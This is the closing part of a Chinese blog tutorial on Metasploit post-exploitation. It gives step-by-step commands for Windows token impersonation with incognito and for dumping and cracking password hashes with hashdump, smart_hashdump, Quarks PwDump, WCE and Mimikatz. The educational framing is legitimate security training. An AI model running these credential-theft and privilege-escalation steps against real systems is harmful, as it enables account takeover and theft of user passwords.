令牌（Token）是系统的临时密钥，相当于账户名和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源。这些令牌将持续存在于系统中，除非系统重新启动。

令牌最大的特点就是随机性、不可预测，一般黑客或软件无法猜测出来。令牌有很多种，比如：

*   访问令牌（Access Token）：表示访问控制操作主题的系统对象；
    
*   密保令牌（Security token）：又叫作认证令牌或者硬件令牌，是一种计算机身份校验的物理设备，例如 U 盾；
    
*   **会话令牌（Session Token）：**是交互会话中唯一的身份标识符。
    

在假冒令牌攻击中需要使用 Kerberost 协议。所以在使用假冒令牌前，先来介绍 Kerberost 协议。Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 / 服务器应用程序提供强大的认证服务。Kerberos 的工作机制如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKcCSP3gxQdb4mM5DrpmXWEBPccoqWuKWUvKK2EXFyyLIIt8VzbnWBaA/640?wx_fmt=png)

前面我们通过 MS17-010 已经实现权限提升，但已经是 System 级权限。但某些情况下可能是 Test 权限，需要进一步提升。

(1) 查看已经获得的权限。

*   **`getuid`**
    

(2) 提权。

*   **`getsystem`**
    

发现提权失败了。  
![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgK02FT7849C7vqzfCO1kbIL1a3nDHgCXCNrw1icyTHVNGISspkY9wn9rQ/640?wx_fmt=png)

(3) 列出可用的 token。

*   **`use incognito`**
    
*   **`list_tokens -u`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKUVmPdI7xmrbQyn08Xr5jxMCndbAMwl1nZzSHH3EicoZTnCUrwGMWo3A/640?wx_fmt=png)

可以看到有两种类型的令牌：

*   一种是 Delegation Tokens，也就是授权令牌，它支持交互式登录，例如可以通过远程桌面登录访问)；
    
*   一种是 Impersonation Tokens，也就是模拟令牌，它是非交互的会话。令牌数量取决于 Meterpreter Shell 的访问级别。
    

由上图可以看到，我们已经获得了一个系统管理员 hacker 的授权令牌，现在就要假冒这个令牌，成功后即可拥有它的权限。

从输出的信息可以看到分配的有效令牌包含 `XI....NQ\hacker`，其中 XI…NQ 是目标机的主机名，hacker 表示登录的用户名。接下来在 incognito 中调用 impersonate token 命令假冒 ge 用户进行攻击，具体方法如下图所示。

*   **`impersonate token XI...NQ\\hacker`**
    
*   **`shell`**
    
*   **`whoami`**
    

注意：在输入 HOSTNAME\USERNAME 时需要两个反斜杠（\\）。运行成功后在 Meterpreter Shell 下运行 shell 命令并输入 whoami，可以看到现在就是假冒的那个 hacker 系统管理员了。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKlnkjNd8KHPylSvhicEu9judILBBfbqZq4KNrTmDQHu48nZcyKKib8IRQ/640?wx_fmt=png)

4.Hash 攻击提权
-----------

Hashdump Meterpreter 脚本可以从目标机器中提取 Hash 值，破解 Hash 值即可获得登录密码。计算机中的每个账号（如果是域服务器，则为域内的每个账号）的用户名和密码都存储在 `sam` 文件中，当计算机运行时，该文件对所有账号进行锁定，要  
想访问就必须有 " 系统级” 账号。所以要使用该命令就必须进行权限的提升。

(1) hashdump 抓取密码  
在 Meterpreter Shell 提示符下输入 hashdump 命令，将导出目标机 sam 数据库中的 Hash。注意，在非 system 权限下会出现失败，报错 “priv_passwd get_sam_hashes: Operation failed: The parameter is incorrect.”

*   **`hashdump`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKNpDM1PhpJHaIYmgeVWpVWRgtmkbC3DSCeAw8weicB4xzInGtGQicLNCw/640?wx_fmt=png)

> 注意，在非 SYSTEM 权限下执行 hashdump 命令会失败，而且在 Windows 7、Windows Server 2008 下有时候会出现进程移植不成功等问题。权限不够需要提升为 system 权限。查看权限可以进入目标机的 cmd 运行 whoami /groups 来查看。

(2) 如果报错，则提权并将进程转移至具有 SYSTEM 权限的进程。

*   **`ps`**
    
*   **`getsystem`**
    
*   **`migrate 664`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKK3wXiaKeI3SnaGnnP0viaXpaeRs9giaOR1ib823vQdIKZv2enTIUGaiaJCg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKoXEKJumg3Jc0merzkjicdPqUfiaf8kTCKDZo8GhzhNiaS03pZxk5OHJJQ/640?wx_fmt=png)

(3) 导出目标机 sam 数据库中的 Hash。

*   **`hashdump`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKU6MW14IkqRuibLRiasd2ib9av2NOIvA7pyAGRHkwibflXHxXkYzKOPY0Nw/640?wx_fmt=png)

(4) smart hashdump 导出用户的 Hash 值。  
另一个模块 smart hashdump 的功能更为强大，可以导出域所有用户的 Hash，其工作流程如下:

*   检查 Meterpreter 会话的权限和目标机操作系统类型。
    
*   检查目标机是否为域控制服务器。
    
*   首先尝试从注册表中读取 Hash, 不行的话再尝试注入 LSASS 进程。
    

命令为：

*   **`run windows/gather/smart_hashdump`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKA4zP5zFROv2ibkkMeHMMibibodTmPPevrvgCKKMqrJIV34R48cVvfMg5w/640?wx_fmt=png)

(5) 通过暴力或者彩虹列表对抓取到的 hash 进行破解。

*   https://www.cmd5.com/
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKrk7hqSFJXHic6zXOChib3hHjbJF1jibzrQXicJ85GvGaXmvcWzhgic0tDVw/640?wx_fmt=png)

说明：在 SAM 文件中保存了两个不同的口令信息，LAN Manager(LM) 口令散列算法和更加强大的加密 NT 版。LM 就是 NT 口令文件的弱点。上图中左边为 LM 版本口令，右边是 NTLM 版本，1001 代表管理员。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKVZxQ7Md4aBcP8onsVw6BJiacvkq3mZXZzpWxia1zopQiahFD3MSEkVxzA/640?wx_fmt=png)

(6) 使用 Quarks PwDump 抓取密码  
PwDump 是一款 Win32 环境下的系统授权信息导出工具，目前没有任何一款工具可以导出如此全面的信息、支持这么多的 OS 版本，而且相当稳定。它目前可以导出:

*   Local accounts NT/LM hashes + history 本机 NT/LM 哈希 + 历史登录记录。
    
*   Domain accounts NT/LM hashes + history 域中的 NT/LM 哈希 + 历史登录记录。
    
*   Cached domain password 缓存中的域管理密码。
    
*   Bitlocker recovery information 使用 Bitlocker 的恢复功能后遗留的信息 (恢复密码 & 关键包)。
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKcZCtaaXbFeNtTsg3qSwG1xm2Jc7lcVJaXDrqibOajQFyk1aFdTS0F7Q/640?wx_fmt=png)

运行该程序如上图所示，默认显示帮助信息，其参数含义如下所示。

*   -dhl: 导出本地哈希值。
    
*   -dhdc: 导出内存中的域控哈希值。
    
*   -dhd: 导出域控哈希值，必须指定 NTDS 文件。
    
*   -db: 导出 Bitlocker 信息， 必须指定 NTDS 文件。
    
*   -nt: 导出 NTDS 文件。
    
*   -hist: 导出历史信息，可选项。
    
*   -t: 可选导出类型，默认导出 John 类型。
    
*   -o: 导出文件到本地。
    

这里使用该工具抓取本机 Hash 值并导出，可以输入如下命令导出本地哈希值到当前目录的 1.txt。此外，该工具还可以配合 Ntdsutil 工具导出域控密码。

*   **`QuarksPwDump.exe -dhl -o 1.txt`**
    

(7) 使用 WCE 抓取密码。  
Windows Credentials Editor (WCE) 是一款功能强大的 Windows 平台内网渗透工具，它能列举登录会话，并且可以添加、改变和删除相关凭据，如 LM/NTHash。

这些功能在内网渗透中能够被利用，例如在 Windows 平台上执行绕过 Hash 操作或者从内存中获取 NT/LM Hash (也可以从交互式登录、服务、远程桌面连接中获取）以用于进一步的攻击，而且体积也非常小，是内网渗透时的必备工具。不过必须在管理员权限下使用，还要注意杀毒工具的免杀。

首先输入 upload 命令将 wce.exe. 上传到目标主机 C 盘中，然后在目标机 Shell 下输入 wce -w 命令，便会成功提取系统明文管理员的密码，如图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKobTgprK9o52p1IxQ6GAqQ1elM9Viat6CmyxrCYfVbbHCeba7PibyvGJQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKdPia8vSVjHwU1HzFNnbPhNocDS0DH9q3k6z8tbuO5UYB2kfaEeaV5icg/640?wx_fmt=png)

另一款工具是 Mimikatz，作为一款轻量级后渗透测试工具，它可以帮助安全测试人员轻松抓取系统密码，此外还包括能够通过获取的 Kerberos 登录凭据，绕过支持 RestrictedAdmin 模式下 Windows 8 或 Windows Server 2012 的远程终端 (RDP) 等功能。后续实战中我们遇到再详细介绍。

同时，Mimikatz 还能在 PowerShell 中执行，实现偷窃、注入凭证、伪造 Kerberos 票证创建，以及很多其他的功能。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKibgkJSwpEAo5SoKdOBTWG6ofcYbB3JzzCUicdL7ibYZSZgTy35dR6nRjA/640?wx_fmt=png)

输入 samdump 命令查看 samdump 的可用选项抓取 Hash。

*   **`mimikatz_command -f samdump::hashes`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKkdLZzYuUtFZrbw90IQSBIAtz5GOCqMRdJYgw9mr8vCbZvKLeLf5USw/640?wx_fmt=png)

四. 总结  

========

写到这里，这篇文章就介绍完毕，希望您喜欢，本文主要是学习徐焱老师他们的《Web 安全攻防渗透测试实战指南》，同时结合作者之前的漏洞利用及 WannaCry 逆向经验总结。文章非常长，作者也花费了很长时间，但相信只要你认真读完并复现，肯定会有收获，尤其是对 MSF 的理解。

*   **一. MSF 漏洞利用回顾**
    
*   **二. 后渗透攻击之信息收集**
    
    1. 进程迁移
    
    2. 系统命令
    
    3. 文件系统命令  
    
*   **三. 后渗透攻击之权限提升**
    
    1. 权限查询
    
    2. 利用 WMIC 实战 MS16-032 本地溢出漏洞
    
    3. 令牌窃取提权
    
    4.Hash 攻击提权  
    
*   **四. 总结**
    

这篇文章中如果存在一些不足，还请海涵。作者作为网络安全初学者的慢慢成长路吧！希望未来能更透彻撰写相关文章。同时非常感谢参考文献中的安全大佬们的文章分享，感谢师傅们的教导，深知自己很菜，得努力前行。

前文分享（下面的超链接可以点击喔）：

*   [[网络安全] 一. Web 渗透入门基础与安全术语普及](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247483786&idx=1&sn=d9096e1e770c660c6a5f4943568ea289&chksm=cfccb147f8bb38512c6808e544e1ec903cdba5947a29cc8a2bede16b8d73d99919d60ae1a8e6&scene=21#wechat_redirect)
    
*   [[网络安全] 二. Web 渗透信息收集之域名、端口、服务、指纹、旁站、CDN 和敏感信息](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247483849&idx=1&sn=dce7b63429b5e93d788b8790df277ff3&chksm=cfccb104f8bb38121c341a5dbc2eb8fa1723a7e845ddcbefe1f6c728568c8451b70934fc3bb2&scene=21#wechat_redirect)
    
*   [[网络安全] 三. 社会工程学那些事及 IP 物理定位](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247483994&idx=1&sn=1f2fd6bea13365c54fec8e142bb48e1d&chksm=cfccb297f8bb3b8156a18ae7edaba9f0a4bd5e38966bdaceeff03a5759ebd216a349f430f409&scene=21#wechat_redirect)
    
*   [[网络安全] 四. 手工 SQL 注入和 SQLMAP 入门基础及案例分析](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484068&idx=1&sn=a82f3d4d121773fdaebf1a11cf8c5586&chksm=cfccb269f8bb3b7f21ecfb0869ce46933e236aa3c5e900659a98643f5186546a172a8f745d78&scene=21#wechat_redirect)
    
*   [[网络安全] 五. XSS 跨站脚本攻击详解及分类 - 1](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484381&idx=1&sn=a1d459a7457b56b02e217f39e5161338&chksm=cfccb310f8bb3a06442b001fc7b38a0363b9fbd4436f450b0ce6fa2eeb5c796fc936ceb5d6fa&scene=21#wechat_redirect)
    
*   [[网络安全] 六. XSS 跨站脚本攻击靶场案例九题及防御方法 - 2](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485174&idx=1&sn=245b812489c845e875cf4bc4763747b7&chksm=cfccb63bf8bb3f2d537f36093de80dbeed5a340b141001d3ef8a9ac9d6336e0aaf62b013a54c&scene=21#wechat_redirect)
    
*   [[网络安全] 七. Burp Suite 工具安装配置、Proxy 基础用法及暴库入门示例](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485381&idx=1&sn=9a0230cf22eba0a24152cb0e73a37224&chksm=cfccb708f8bb3e1ecf68078746521191921f41d19a0b82cb3f097856dad7a85c4d9c34750b3f&scene=21#wechat_redirect)
    
*   [[网络安全] 八. Web 漏洞及端口扫描之 Nmap、ThreatScan 和 DirBuster 工具](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485437&idx=1&sn=2a7179464207fa68b708297ec0db6f00&chksm=cfccb730f8bb3e2629edb5ca114de79723e323512be9538a4d512297f8728a3a9d7718389b60&scene=21#wechat_redirect)
    
*   [[网络安全] 九. Wireshark 安装入门及抓取网站用户名密码 - 1](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485465&idx=1&sn=8e7f1f5790bfe754affe0599a3fce1ee&chksm=cfccb8d4f8bb31c2ca36f6467d700f4e4d7821899a6d5173ac0b525f0f6227c8392252b5c775&scene=21#wechat_redirect)
    
*   [[网络安全] 十. Wireshark 抓包原理、ARP 劫持、MAC 泛洪及数据流追踪 - 2](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485551&idx=1&sn=15f00e14f4376e179a558444de8ef0a5&chksm=cfccb8a2f8bb31b456499a937598e750661841b5ca166a12073e343a049737fa3131fd422dc5&scene=21#wechat_redirect)
    
*   [[网络安全] 十一. Shodan 搜索引擎详解及 Python 命令行调用](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485599&idx=1&sn=0c60c042911fc79287417c2385550430&chksm=cfccb852f8bb3144a89f6b0d0df6c185a208aa989d98f8c7e3b7d741dedc371b3ecb4e70a747&scene=21#wechat_redirect)
    
*   [[网络安全] 十二. 文件上传漏洞 (1) 基础原理及 Caidao 入门知识](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485787&idx=1&sn=0c75cf81c4234031273bced4dff0b25c&chksm=cfccb996f8bb3080fe9583043b43665095fd6935a4147a2bb0d1ab9b91a6cde99da4747c5201&scene=21#wechat_redirect)
    
*   [[网络安全] 十三. 文件上传漏洞 (2) 常用绕过方法及 IIS6.0 解析漏洞](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485833&idx=1&sn=a613116633338ca85dfd1966052b0b02&chksm=cfccb944f8bb305296a32dac7f0942e727d66dc9f710bfb82c3597500e97d39714ecd2ed18cf&scene=21#wechat_redirect)
    
*   [[网络安全] 十四. 文件上传漏洞 (3) 编辑器漏洞和 IIS 高版本漏洞及防御](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485871&idx=1&sn=e6d0248e483dea9616a5d615f852eccb&chksm=cfccb962f8bb3074516c1ef8e01c7cb00a174fa5b1a51de3a49b13fd8c7846deeaf6d0e24480&scene=21#wechat_redirect)
    
*   [[网络安全] 十五. 文件上传漏洞 (4)Upload-labs 靶场及 CTF 题目 01-10](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488340&idx=1&sn=5b7bf5602294586f819340bd6190a34d&chksm=cfcca399f8bb2a8f746fc09c7142facc8ea17c008ba46dee423b90ff6abb3cd4486edf52d201&scene=21#wechat_redirect)
    
*   [[网络安全] 十六. 文件上传漏洞 (5) 绕狗一句话原理和绕过安全狗](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488396&idx=1&sn=67c1b13f041040c09c236bba99edfe0a&chksm=cfcca341f8bb2a5729778490db7441a4ddfdfa05dcc5f6322b4860db7780056f9f05f5bc0b3d&scene=21#wechat_redirect)  
    
*   [[网络安全] 十八. Metasploit 技术之基础用法万字详解及 MS17-010 漏洞复现](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488255&idx=1&sn=28b1f54fd420a0145cb95b842a36c567&chksm=cfcca232f8bb2b243bf4cbf5c1741c6af2c1fc666985d34b4f6b4a6ee3161d18975bb5ea18fc&scene=21#wechat_redirect)
    
*   [网络安全] 十九. Metasploit 后渗透技术之信息收集和权限提权
    

最后，真诚地感谢您关注 “娜璋之家” 公众号，也希望我的文章能陪伴你成长，希望在技术路上不断前行。文章如果对你有帮助、有感悟，就是对我最好的回报，且看且珍惜！再次感谢您的关注，也请帮忙宣传下“娜璋之家”，哈哈~ 初来乍到，还请多多指教。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRM3WZSXenNHZxNSn1sU9grFMFsvY4FuVwFmGFElAIGNbA4yicYhbhxCBEJZnxMk1rB5LZ6AsBPcdag/640?wx_fmt=png)

(By:Eastmount 2021-03-04 夜于武汉)

参考文章如下，感谢这些大佬。

*   [1] https://www.rapid7.com/products/metasploit/download/
    
*   [2] 《Web 安全攻防渗透测试实战指南》徐焱、李文轩、王东亚老师
    
*   [3] https://blog.csdn.net/Eastmount
    
*   [4] https://www.cnblogs.com/coderge/p/13746810.html
    
*   [5] https://blog.csdn.net/fageweiketang/article/details/86580213
    
*   [6] https://blog.csdn.net/fageweiketang/article/details/86665518
    
*   [7] https://www.cnblogs.com/-qing-/p/10519363.html
    
*   [8] https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit